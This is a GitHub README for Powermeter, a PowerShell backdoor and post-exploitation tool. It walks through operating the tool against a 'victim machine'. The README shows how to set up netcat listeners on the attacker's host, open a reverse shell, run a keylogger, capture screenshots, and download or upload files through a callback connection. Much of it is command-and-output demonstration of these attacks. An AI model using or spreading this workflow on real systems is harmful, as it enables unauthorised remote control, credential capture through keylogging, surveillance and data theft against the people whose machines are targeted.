# Powermeter
Powermeter is a basic powershell based backdoor/post exploit tool. Main functionalities are shown below. You can also check the video at the bottom of the page.
Note: It is highly recommended to watch the video at 1080p due to low quality of recording. It will be fixed soon :=)

To run this program you need to solve execution-policy problem on your system.

## How to run?
![pm1](https://github.com/mfcekirdek/Powermeter/blob/master/pm1.png "pm1")

	#Import powermeter functions
	>> PS C:\Users\decoder\Desktop> . .\powermeter.ps1
	
	#Start powermeter.
	#When this command is invoked, powermeter will establish a TCP connection to $SHOST:$SPORT (in this case 192.168.214.1:9190). After that, powermeter remote user interface will be ready to take commands and attacker will be able to use powermeter via this tcp connection.
	#$SPORT should be opened at $SHOST machine (in other words, attacker machine).'nc -lvp <SPORT>' command can do the trick. The main connection between powermeter and attacker will be established via this port. Attacker send commands to powermeter from this port. 
	#$FLPORT will be used for any job which requires file transfer (those are download,upload,screencap and keylogger threads). For example, if you want to download a from victim machine, you need to provide a listener $FLPORT at $SHOST machine like this: 'nc -lvp <FLPORT> > downloadedFile'. After that you can call the download function from powermeter shell like this: 'download C:\Users\decoder\Desktop\cozbeni.zip'
	>> PS C:\Users\decoder\Desktop> Start-Powermeter -SHOST 192.168.214.1 -SPORT 9190 -FLPORT 9192
	
	Parameters:
	SHOST - attacker machine's IP.
	SPORT - an open attacker machine port that waits for powermeter connection. #'nc -lvp <SPORT>' command can do the trick.
	FLPORT - attacker machine's file transfer port. This port should be opened at attacker's side to achieve jobs which includes downloading and uploading. (Screencapturing and keylogging are also inclusive because both of them use downloader threads. You may want to see the demo video to see how it works.)

## Commands

### In main module:

#### show options

Powermeter>show options

	 Command                			 Description
	 -------                			 -----------
	 get sysinfo            			 Get system information about victim machine
	 get username           			 Get username of victim machine
	 set FLPORT=<port>      			 Set file transfer port
	 rshell                 			 Open reverse shell module
	 start keylogger        			 Start keylogger thread
	 show jobs              			 Show all active threads
	 stop job -keylogger    			 Stop keylogger thread and download captured keystrokes from file port
	 stop job -reverseShell 			 Stop reverse shell session and thread
	 stop job -sendFile     			 Stop file downloading thread
	 stop job -receiveFile  			 Stop file uploading thread
	 stop job -all          			 Stop all active threads
	 screencap -screen      			 Capture screenshot of victim machine [WHOLE SCREEN] and download it
	 screencap -activeWindow			 Capture screenshot of victim machine [ACTIVE WINDOW] and download it
	 download <fileFromVictim>			 Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]
	 upload <fileToVictim>  			 Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]
	 exit                   			 Exit the program
	 Important: File transfer port should be opened at attacker's side to achieve downloading,uploading files.


![pm2](https://github.com/mfcekirdek/Powermeter/blob/master/pm2.png "pm2")

#### get sysinfo

Powermeter>get sysinfo

	 Name                   		Value
	 -------                		--------
	 OS Version:            		Microsoft Windows 7 Enterprise 
	 Install Date:          		20171223133718.000000+180
	 Service Pack Version:            		1
	 OS Architecture:       		64-bit
	 Boot Device:           		\Device\HarddiskVolume1
	 Build Number:          		7601
	 Host Name:             		WIN-1D86SE11EIA
	 Internet Explorer Version:		8.0.7601.17514

![pm3](https://github.com/mfcekirdek/Powermeter/blob/master/pm3.png "pm3")

#### set FLPORT=\<PORT>

	Powershell>set FLPORT=9192  
	[+]FLPORT is set  

![pm4](https://github.com/mfcekirdek/Powermeter/blob/master/pm4.png "pm4")

#### get username

	Powermeter>get username  
	decoder  

![pm5](https://github.com/mfcekirdek/Powermeter/blob/master/pm5.png "pm5")

#### rshell

[prerequisite]:  
On attacker side> nc -lvp 9191  

Powermeter>rshell  
Powermeter>reverse_shell>set LHOST=192.168.214.1  
[+]LHOST is set  
Powermeter>reverse_shell>set LPORT=9191  
[+]LPORT is set  
Powermeter>reverse_shell>run  
Powermeter>reverse_shell>[+]TCP reverse shell  

![pm6](https://github.com/mfcekirdek/Powermeter/blob/master/pm6.png "pm6")

![pm7](https://github.com/mfcekirdek/Powermeter/blob/master/pm7.png "pm7")

Other commands in reverse shell module:

Powermeter>reverse_shell>show options

	 Command                			 Description
	 -------                			 -----------
	 set LHOST=<IPv4>       			 Set local IP address
	 set LPORT=<port>       			 Set local port address
	 run                    			 Start reverse shell
	 back                   			 Exit from reverse shell module

![pm23](https://github.com/mfcekirdek/Powermeter/blob/master/pm23.png "pm23")

#### stop job -reverseShell (stop job -rs)

Powermeter>stop job -reverseShell  
[+]ReverseShellJob is terminated..  

![pm8](https://github.com/mfcekirdek/Powermeter/blob/master/pm8.png "pm8")

#### show jobs

Powermeter>show jobs  
[+]Active jobs:  

JobStateInfo  : Running  
Finished      : System.Threading.ManualResetEvent  
InstanceId    : 50fae208-73d2-4ea0-8f91-0c37597c918b  
Id            : 5  
Name          : ReverseShellJob  
ChildJobs     : {Job6}  
Output        : {}  
Error         : {}  
Progress      : {}  
Verbose       : {}  
Debug         : {}  
Warning       : {}  
State         : Running  

![pm9](https://github.com/mfcekirdek/Powermeter/blob/master/pm9.png "pm9")

#### stop job -all

Powermeter>stop job -all  
[+]ReverseShellJob is terminated..  
[+]ReceiveFileJob is terminated..  

![pm10](https://github.com/mfcekirdek/Powermeter/blob/master/pm10.png "pm10")

#### screencap -screen

[prerequisite]:  
On attacker side> nc -lvp 9192 > screenshot.png  

Powermeter>screencap -screen  
[+]Screenshot saved..  

![pm12](https://github.com/mfcekirdek/Powermeter/blob/master/pm12.png "pm12")

![pm13](https://github.com/mfcekirdek/Powermeter/blob/master/pm13.png "pm13")

#### screencap -activeWindow

[prerequisite]:   
On attacker side> nc -lvp 9192 > screenshotActiveWindow.png  

Powermeter>screencap -activeWindow  
[+]Screenshot is saving..  

![pm14](https://github.com/mfcekirdek/Powermeter/blob/master/pm14.png "pm14")

![pm24](https://github.com/mfcekirdek/Powermeter/blob/master/pm24.png "pm24")

#### start keylogger & stop job -keylogger

[prerequisite]:   
On attacker side> nc -lvp 9192 > log.txt  

Powermeter>start keylogger  
[+]KeyLogger is starting..  
Powermeter>stop job -keylogger  
[+]Keylogger is terminated..  

![pm15](https://github.com/mfcekirdek/Powermeter/blob/master/pm15.png "pm15")

![pm19](https://github.com/mfcekirdek/Powermeter/blob/master/pm19.png "pm19")

#### download <file>

[prerequisite]:   
On attacker side> nc -lvp 9192 > downloadedFile  

Powermeter>download C:\Users\decoder\Desktop\cozbeni.zip  
[+]File is downloading..  

![pm18](https://github.com/mfcekirdek/Powermeter/blob/master/pm18.png "pm18")

![pm25](https://github.com/mfcekirdek/Powermeter/blob/master/pm25.png "pm25")

#### upload <file>

[prerequisite]:   
On attacker side> nc -lvp 9192 \< uploadedFile  

Powermeter>upload C:\Users\decoder\Desktop\img.jpg  
[+]File is uploading..  

![pm20](https://github.com/mfcekirdek/Powermeter/blob/master/pm20.png "pm20")

![pm22](https://github.com/mfcekirdek/Powermeter/blob/master/pm22.png "pm22")


A quick demo video
=============

[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/0D49nX_bD_8/0.jpg)](https://www.youtube.com/watch?v=0D49nX_bD_8)

